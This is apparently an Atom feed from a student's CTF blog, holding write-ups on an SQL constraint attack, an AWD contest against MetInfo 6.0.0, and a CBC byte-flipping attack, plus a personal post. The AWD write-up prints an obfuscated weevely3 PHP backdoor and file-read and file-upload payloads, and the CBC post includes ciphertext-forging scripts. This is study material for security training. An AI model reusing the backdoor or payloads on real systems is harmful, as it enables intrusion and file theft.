<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>virtua1&#39;s blog</title>
  
  <subtitle>web萌新</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-07-05T01:34:52.520Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>virtua1</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql约束攻击</title>
    <link href="http://yoursite.com/2018/07/05/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/07/05/sql约束攻击/</id>
    <published>2018-07-05T01:32:24.472Z</published>
    <updated>2018-07-05T01:34:52.520Z</updated>
    
    <content type="html"><![CDATA[<p>昨天在做bugku的题的时候遇到一道sql约束攻击的题目，比较简单，但是感觉比较有意思，简单梳理一下。应该昨天发的，看大佬的博客看到一点多，太困了，就今天早上起来整理了一下XD。小假期结束了，要开始复习了orz~<br>参考大佬的博客：<a href="http://goodwaf.com/2016/12/30/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%9A%84SQL%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">传送门</a></p><p><strong>sql约束攻击的思路：</strong><br>利用数据库对空格符的特殊处理方式来达到水平越权的目的。</p><p><strong>知识背景：</strong></p><p>1、字符串比较：在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“admin”等同于“admin空格”，对于绝大多数情况来说都是成立的（如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果是一样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos;;</span><br><span class="line">SELECT * FROM users WHERE username=&apos;admin &apos;;</span><br></pre></td></tr></table></figure><p>当然这种特性有时候也存在异常情况，例如LIKE子句。<br>PS:对尾部空白符的这种修剪操作，主要是在“字符串比较”时进行的。比较字符串时SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。因为在数据库中查询就是比较字符串，利用字符串这种比较特性，所以两者查询结果是一样的。</p><p>2、INSERT截断：设计一个字段时，SQL都会根据VARCHAR(n)来限制字符串的最大长度。当实际输入的字符串大于最大长度的时候，数据库会对其进行截断。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“admin空格x”时，实际上只能插入字符串的前5个字符，即“admin”。</p><p><strong>利用场景：</strong></p><p>1、场景：当我们需要登陆[admin]来获取想要的信息，但我们却不知道admin的密码的时候，我们可以注册[admin空格x] 用我们注册的登陆密码登陆admin，达到目的，注意注册的用户名无数空格后还有字符x，否则注册查询的时候会查重，空格个数要超过数据库的长度限制。</p><p>2、代码：</p><p>1）注册用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Checking whether a user with the same username exists</span><br><span class="line">$username = mysql_real_escape_string($_GET[&apos;username&apos;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&apos;password&apos;]);</span><br><span class="line">$query = &quot;SELECT *</span><br><span class="line">          FROM users</span><br><span class="line">          WHERE username=&apos;$username&apos;&quot;;</span><br><span class="line">$res = mysql_query($query, $database);</span><br><span class="line">if($res) &#123;</span><br><span class="line">  if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">    // User exists, exit gracefully</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    // If not, only then insert a new entry</span><br><span class="line">    $query = &quot;INSERT INTO users(username, password)</span><br><span class="line">              VALUES (&apos;$username&apos;,&apos;$password&apos;)&quot;;</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由代码可知，我们注册时会先从数据库查询我们注册的username是否存在，如果存在就会报重，不存在就执行INSERT。我们用[admin空格x]注册，绕过username验证，执行INSERT，因为数据库对字符串长度进行了限制，所以实际插入的前几位，也就是注册的为[admin空格]，只要我们的空格足够多，就可以实现。</p><p>2）验证登陆：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&apos;username&apos;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&apos;password&apos;]);</span><br><span class="line">$query = &quot;SELECT username FROM users</span><br><span class="line">          WHERE username=&apos;$username&apos;</span><br><span class="line">              AND password=&apos;$password&apos; &quot;;</span><br><span class="line">$res = mysql_query($query, $database);</span><br><span class="line">if($res) &#123;</span><br><span class="line">  if(mysql_num_rows($res) &gt; 0)&#123;</span><br><span class="line">      $row = mysql_fetch_assoc($res);</span><br><span class="line">      return $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">return Null;</span><br></pre></td></tr></table></figure><p>可见登陆的时候可以利用[admin]和注册[admin空格]的密码来登陆，就可以绕过验证。</p><p><strong>利用限制：</strong></p><p>当然这种攻击是局限性的需要满足：<br>1、服务端没有对用户名长度进行限制。如果限制了我们就无法注册[admin空格x]。<br>2、登陆验证的SQL语句必须是用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码，然后再比对密码的话，那么也不能进行利用。因为当使用admin为用户名来查询密码的话，数据库此时就会返回两条记录，而一般取第一条则是目标用户的记录，那么你传输的密码肯定是和目标用户密码匹配不上的。<br>3、验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名。因为当我们以用户admin和密码登陆时，其实数据库返回的是我们自己的用户信息，而我们的用户名其实是[admin空格]，如果此后的业务逻辑以该用户名为准，那么就不能达到越权的目的了。</p><p><strong>防御手段：</strong><br>我们可以利用限制条件来进行防御。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天在做bugku的题的时候遇到一道sql约束攻击的题目，比较简单，但是感觉比较有意思，简单梳理一下。应该昨天发的，看大佬的博客看到一点多，太困了，就今天早上起来整理了一下XD。小假期结束了，要开始复习了orz~&lt;br&gt;参考大佬的博客：&lt;a href=&quot;http://goo
      
    
    </summary>
    
      <category term="CTF-web" scheme="http://yoursite.com/categories/CTF-web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="sql约束攻击" scheme="http://yoursite.com/tags/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>“蓝帽杯”--第一次AWD之旅</title>
    <link href="http://yoursite.com/2018/07/03/%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D--%E7%AC%AC%E4%B8%80%E6%AC%A1AWD%E4%B9%8B%E6%97%85/"/>
    <id>http://yoursite.com/2018/07/03/“蓝帽杯”--第一次AWD之旅/</id>
    <published>2018-07-03T10:47:40.647Z</published>
    <updated>2018-07-04T01:30:13.806Z</updated>
    
    <content type="html"><![CDATA[<p>很幸运参加了第二届“蓝帽杯”的分区赛，这也是参加的第一场线下赛，体验非常好，学到了很多东西，也见识到了大佬们的姿势。<br>全程在防守，审出漏洞也看不出来，不会用，要学的还有太多了。<br>参加的是浙江赛区的比赛，赛后重新梳理了一下web题目。</p><p>题目是 Metinfo6.0.0，一共有5个漏洞，4个主办方加进去的，还有一个Metinfo6.0.0任意文件读取漏洞。</p><p>1、 后台seo任意文件读取漏洞<br>路径：\admin\seo\htm.php<br><img src="/2018/07/03/“蓝帽杯”--第一次AWD之旅/image001.png" alt="这里写图片描述"><br>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;seourl&apos;]))&#123;</span><br><span class="line">echo file_get_contents(base64_decode(&apos;L2ZsYWc=&apos;));&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">/admin/seo/htm.php?seourl</span><br></pre></td></tr></table></figure><p>2、 weevely3后门<br>路径：\app\system\news\web\news.class.php<br><img src="/2018/07/03/“蓝帽杯”--第一次AWD之旅/image002.png" alt="这里写图片描述"><br>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$t = &apos;pre2Fss(@2Fx(@b2Fase64_deco2F2Fde(preg2F_r2Fepl2Face(array(&quot;/_/&quot;,2F&quot;2F/-/&quot;),array(&quot;/2F&quot;,&quot;2F+&quot;)2&apos;;</span><br><span class="line">    $O = &apos;er&quot;2F;$i=$m[1][02F]2F.$m[1][1];2F$h=$sl2F($s2Fs(md5(2F$i.$kh)2F2F2F,0,3));$2Ff2F=$sl(2F$ss(md5(&apos;;</span><br><span class="line">    $s = &apos;rpos(2F$p,$h)===0)2F&#123;$2Fs[$i]=2F&quot;&quot;;$p=2F$ss($p,3)2F2F2F;&#125;if(array2F_key_2Fexists($i,$s))2F&#123;2F$s&apos;;</span><br><span class="line">    $U = &apos;F,$ss($s[2F$i2F],0,2F$e))),$k2F)2F));2F$o2F=ob_get_contents();ob_end_2Fclean(2F);$2Fd=b2Fase64_&apos;;</span><br><span class="line">    $l = &apos;2F[$i].=$p;2F$e=strpos($s2F[2F$i2F],$f);if($e2F2F)&#123;$k=2F2F$kh.$kf;ob_start();@ev2Fal(@gzu2Fncom&apos;;</span><br><span class="line">    $A = str_replace(&apos;Th&apos;, &apos;&apos;, &apos;ThcreThThaThte_funThThction&apos;);</span><br><span class="line">    $N = &apos;m2F);if($2Fq&amp;&amp;$m)&#123;@ses2Fsion_2Fstar2Ft();$s=&amp;2F$_S2FESSION;$ss2F2F=&quot;substr&quot;;$sl2F=&quot;strt2F2Folow&apos;;</span><br><span class="line">    $q = &apos;&quot;2F&quot;;for($i=0;$i&lt;$2Fl;)2F&#123;2Ffor($j=0;($j&lt;$2Fc&amp;&amp;$i&lt;$l2F);$j+2F+,2F$i++)2F&#123;$o.=$t&#123;$i&#125;^2F$k&#123;$j2F&#125;;&apos;;</span><br><span class="line">    $K = &apos;=array_value2Fs2F($q);preg2F_2Fma2Ftch_a2Fll(&quot;/([\\w])[\\w-2F]+2F(?:2F;q=0.([\\d]))?,?/&quot;,$2Fra2F,$&apos;;</span><br><span class="line">    $F = &apos;_LANGUAGE2F&quot;];if($rr&amp;&amp;2F$r2F2Fa)&#123;$u=par2Fse2F_u2Frl($rr);parse2F_str($2Fu2F[&quot;query&quot;],$q2F)2F;$q&apos;;</span><br><span class="line">    $c = &apos;2F&#125;&#125;return $2Fo;2F&#125;$r=$_2FSE2FRVE2FR;$rr=@2F$r[&quot;2FHT2FTP_2FREFERER&quot;];$ra=@$r[2F&quot;HTTP_ACCE2F2FPT&apos;;</span><br><span class="line">    $d = &apos;$i.2F$kf)2F,0,3));$p=&quot;&quot;;for($z=2F1;$z&lt;coun2Ft2F($m[1]);$z+2F+)2F$p.=$q[$m2F[2]2F[$2Fz]2F];if(st&apos;;</span><br><span class="line">    $X = &apos;$kh=&quot;ccd2&quot;2F;$kf=&quot;2Fe8f9&quot;;f2Funct2Fion x($2Ft,$2Fk)&#123;$c=st2Fr2Fl2Fen($k);$l=strlen2F($t2F);$o=2F&apos;;</span><br><span class="line">    $m = &apos;e2Fncode(x(gzc2Fomp2Fr2Fess($o),2F$k))2F;print(&quot;&lt;2F$k&gt;2F$d&lt;/$k2F&gt;&quot;);@se2Fss2Fion_destroy();&#125;&#125;&#125;&#125;&apos;;</span><br><span class="line">    $E = str_replace(&apos;2F&apos;, &apos;&apos;, $X . $q . $c . $F . $K . $N . $O . $d . $s . $l . $t . $U . $m);</span><br><span class="line">    $I = $A(&apos;&apos;, $E);</span><br><span class="line">    $I();</span><br></pre></td></tr></table></figure></p><p>这是 一个PHP混淆后门，混淆的特别乱，将原来的代码打乱顺序混淆。<br>经过分析，混淆进行的操作，先按照 $X . $q . $c . $F . $K . $N . $O . $d . $s . $l . $t . $U . $m  拼接字符串，然后删除2F，去除$l 中的Th 利用create_function()创建$l函数<br>进行反混淆和美化：<br><img src="/2018/07/03/“蓝帽杯”--第一次AWD之旅/image003.png" alt="这里写图片描述"><br><img src="/2018/07/03/“蓝帽杯”--第一次AWD之旅/image004.png" alt="这里写图片描述"><br>3、任意文件读取漏洞<br>路径：\app\system\img\web\img.class.php<br><img src="/2018/07/03/“蓝帽杯”--第一次AWD之旅/image008.png" alt="这里写图片描述"><br>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function doshowimg()&#123;</span><br><span class="line">        global $_M;</span><br><span class="line">        $this-&gt;showpage(&apos;img&apos;);</span><br><span class="line">        if(isset($_GET[&apos;images&apos;]))&#123;</span><br><span class="line">        @$imga=$_GET[&apos;a&apos;];</span><br><span class="line">        @$imgs=$_GET[&apos;b&apos;].&apos;tents&apos;;</span><br><span class="line">        echo @$imgs($imga);&#125;</span><br><span class="line">        require_once $this-&gt;template(&apos;tem/showimg&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>get 方式提交images、a、b 其中 get b 后边是tents  b=构成 file_get_contens<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?images=1&amp;b=file_get_con&amp;a=/flag</span><br></pre></td></tr></table></figure></p><p>4、任意文件读取漏洞<br>路径：\app\system\include\ module\old_thumb.class.php<br><img src="/2018/07/03/“蓝帽杯”--第一次AWD之旅/image005.png" alt="这里写图片描述"><br><img src="/2018/07/03/“蓝帽杯”--第一次AWD之旅/image006.png" alt="这里写图片描述"><br>关键代码：<br><img src="/2018/07/03/“蓝帽杯”--第一次AWD之旅/image007.png" alt="这里写图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：/include/thumb.php?dir=http/...././/...././/...././/...././/...././/flag</span><br></pre></td></tr></table></figure></p><p>5、 找回密码处任意文件上传漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST ////////admin/index.php?</span><br><span class="line">lang=cn&amp;anyid=&amp;n=getpassword&amp;c=index&amp;a=dogetpassword </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host:     .    .    .    .</span><br><span class="line">action=next2&amp;abt_type=2&amp;admin_mobile=123123&amp;admin_type=/t</span><br><span class="line">mp/1.php&amp;submit=%E4%B8%8B%E4%B8%80%E6%AD%A5</span><br></pre></td></tr></table></figure></p><p>最后有一个漏洞看了wp才知道的，通过这次比赛更加证明了自己的菜，而且不是一般的菜，要学的东西还有很多，漏洞中的weevely3后门和Metinfo6.0.0任意文件读取漏洞还是得单独总结复现一下，另外要积累各种漏洞存在的形式，像是各种混淆后门、变形木马、任意文件读取的方式等。</p><p>学喜欢的，做想做的，加油！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;很幸运参加了第二届“蓝帽杯”的分区赛，这也是参加的第一场线下赛，体验非常好，学到了很多东西，也见识到了大佬们的姿势。&lt;br&gt;全程在防守，审出漏洞也看不出来，不会用，要学的还有太多了。&lt;br&gt;参加的是浙江赛区的比赛，赛后重新梳理了一下web题目。&lt;/p&gt;
&lt;p&gt;题目是 Met
      
    
    </summary>
    
      <category term="CTF-AWD" scheme="http://yoursite.com/categories/CTF-AWD/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="AWD" scheme="http://yoursite.com/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="http://yoursite.com/2018/07/02/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/07/02/CBC字节翻转攻击/</id>
    <published>2018-07-02T01:10:30.515Z</published>
    <updated>2018-07-05T01:35:27.227Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间ISCC遇到了一道CBC字节翻转攻击的题目，感觉比较有意思，就总结了一下。</p><p>1、首先来了解一下CBC模式：CBC模式是分组密码模式的一种，其加密过程如下：<br> <img src="/2018/07/02/CBC字节翻转攻击/image001.png" alt="这里写图片描述"><br>IV：初始化向量。<br>plaintext：明文分组。<br>cipertext：密文分组。<br>key：密钥。<br>CBC工作于一个固定的比特组，称为一个块。本文我们把16字节作为一个块。<br>简单来说：CBC模式加密就是先将明文进行分组（常见16字节为一组），将每个明文分组与前一个密文分组进行XOR运算再通过key加密得到密文，其中第一组明文与初始化向量IV进行XOR运算得到第一组密文。<br>最后将IV与得到的密文拼接得到最终的密文。<br>从加密的方式我们不难发现各组都是有关联的，这是与ECB得不同之处，与ECB比较相对比较安全。<br>其解密过程：<br> <img src="/2018/07/02/CBC字节翻转攻击/image002.png" alt="这里写图片描述"><br>理解了加密，解密也容易理解，就是加密得逆过程：从密文中提取出IV，然后分组，每组密文先用key解密，然后再与上一组得密文XOR运算得到明文，其中第一组用key解密之后再和IV XOR运算得到明文。</p><p>2、从CBC模式得原理我们不难发现 如果我们想改变解密后的某一明文，得到我们想得到得明文，如果是第一组，只需要改变IV，否则只需要改变上一组密文，就可以控制我们得到的明文。<br>如下图：<br><img src="/2018/07/02/CBC字节翻转攻击/image003.png" alt="这里写图片描述"><br>我们要改变1处想要得到特定明文，就可以修改2处的密文，这就是CBC字节翻转攻击的简单理解。<br>3、利用CBC字节翻转攻击的题目往往是修改密文，使密文修改后解密得到我们想得到的明文，绕过限制。<br>这类题目的源码都是差不多的，以下面源码为例分析一下：<br> <img src="/2018/07/02/CBC字节翻转攻击/image004.png" alt="这里写图片描述"><br> <img src="/2018/07/02/CBC字节翻转攻击/image005.jpg" alt="这里写图片描述"><br> <img src="/2018/07/02/CBC字节翻转攻击/image006.png" alt="这里写图片描述"><br> <img src="/2018/07/02/CBC字节翻转攻击/image007.jpg" alt="这里写图片描述"><br>源码的意思是，随机产生初始化向量IV<br>把输入的username序列化 然后加密 IV也加密<br>解密并验证 如果username为admin 则输出flag<br>但是后边限制了post的username 不能为admin<br>我们便可以用CBC字节翻转攻击绕过这种限制，也就是修改加密后username 使其解密后为admin 得到flag。<br>3、例题：（ISCC2018. Only admin can see flag）</p><p>根据提示在index.txt 看到源码：<br> <img src="/2018/07/02/CBC字节翻转攻击/image008.png" alt="这里写图片描述"><br> <img src="/2018/07/02/CBC字节翻转攻击/image009.png" alt="这里写图片描述"><br>审计代码，发现admin登陆才可以得到flag，但是又限制post的username不能为admin，很显然要用CBC字节翻转攻击，先用abmin 登陆，再根据攻击原理改为admin。</p><p>用username=abmin 登陆，bp抓包：<br> <img src="/2018/07/02/CBC字节翻转攻击/image010.png" alt="这里写图片描述"><br>得到IV 和cipher。</p><p>根据CBC加密过程我们先将输入序列化并分组（16字节为一组）：<br>s:2:{s:8:”username”;s:5:”abmin”;s:8:”password”;s:5:”abmin”;}<br>①  s:2:{s:8:”userna<br>②  me”;s:5:”abmin”;<br>③  s:8:”password”;s<br>④  :5:”abmin”;}<br>分析：我们的目是把abmin 改为admin 由分组可知b在第二组的第11位，所以我们要修改第一组的u  脚本实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">nweCipher=&apos;&apos;</span><br><span class="line"></span><br><span class="line">cipher = &apos;bp抓到的cipher经过url解密后的值&apos;  </span><br><span class="line">cipher = base64.b64decode(cipher) #先进行解密</span><br><span class="line">newCipher = cipher[0:11] + chr(ord(cipher[11])^ord(&apos;b&apos;)^ord(&apos;d&apos;)) + cipher[12:] #XOR运算修改</span><br><span class="line">print base64.b64encode(newCipher)  #再进行加密</span><br></pre></td></tr></table></figure></p><p><img src="/2018/07/02/CBC字节翻转攻击/image011.png" alt="这里写图片描述"></p><p>在bp中添加cookie IV和修改后的cipher(脚本后得到的经过url加密） 注意添加前把post清空 然后go<br> <img src="/2018/07/02/CBC字节翻转攻击/image012.png" alt="这里写图片描述"><br>返回结果：<br> <img src="/2018/07/02/CBC字节翻转攻击/image013.png" alt="这里写图片描述"><br>回应无法反序列化，把无法反序列化字符串解密，发现已经变成了admin，但是我们翻转的时候破坏了第一组，所以无法反序列化，那我们需要把IV修复。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">cipher = &apos;&apos;#无法反序列化的字符串</span><br><span class="line">iv = &apos;&apos;#先前得到的IV</span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher))#给cipher解密</span><br><span class="line">iv = base64.b64decode(iv) #给先前的IV解密</span><br><span class="line">newIv = &apos;&apos;</span><br><span class="line">right = &apos;&apos;#破坏前正确的字符串</span><br><span class="line">for i in range(16):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))#一位位修复</span><br><span class="line">    print urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure><p>返回：<br> <img src="/2018/07/02/CBC字节翻转攻击/image014.png" alt="这里写图片描述"><br>再cookie添加 生成的IV 和 修改的cipher 即可得到flag。<br> <img src="/2018/07/02/CBC字节翻转攻击/image015.png" alt="这里写图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间ISCC遇到了一道CBC字节翻转攻击的题目，感觉比较有意思，就总结了一下。&lt;/p&gt;
&lt;p&gt;1、首先来了解一下CBC模式：CBC模式是分组密码模式的一种，其加密过程如下：&lt;br&gt; &lt;img src=&quot;/2018/07/02/CBC字节翻转攻击/image001.png
      
    
    </summary>
    
      <category term="CTF-web" scheme="http://yoursite.com/categories/CTF-web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="CBC字节翻转攻击" scheme="http://yoursite.com/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>在路上</title>
    <link href="http://yoursite.com/2018/07/02/%E5%9C%A8%E8%B7%AF%E4%B8%8A/"/>
    <id>http://yoursite.com/2018/07/02/在路上/</id>
    <published>2018-07-02T00:52:45.933Z</published>
    <updated>2018-07-04T01:23:59.603Z</updated>
    
    <content type="html"><![CDATA[<p>刚刚搭建起自己的博客，很多地方以后慢慢完善。</p><p>大一接近尾声了，这一年收获很多，认识了很多人，去了很多地方，当然也有很多不快，警校就是这样吧。自己很多方面还需要去完善，去改正，处理时间方面还是不够好，好好努力，做自己想做的事情。这段时间也挺多事，来的也比较突然的，心情起起落落的，也许我们需要去经历这么多，在突如其来的各种事情面前不知所措，希望都能安稳过去，真的很累！</p><p>学习web有一段时间了，还不能说是完全入门，多少也有些了解了，感觉很多东西很有意思，所以慢慢学。按照自己的计划学习自己喜欢的东西。</p><p>希望最坏的快点过去，安安稳稳学技术。祈祷^^</p><p>坚持写博客、坚持学习！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;刚刚搭建起自己的博客，很多地方以后慢慢完善。&lt;/p&gt;
&lt;p&gt;大一接近尾声了，这一年收获很多，认识了很多人，去了很多地方，当然也有很多不快，警校就是这样吧。自己很多方面还需要去完善，去改正，处理时间方面还是不够好，好好努力，做自己想做的事情。这段时间也挺多事，来的也比较突然的
      
    
    </summary>
    
      <category term="生活小记" scheme="http://yoursite.com/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
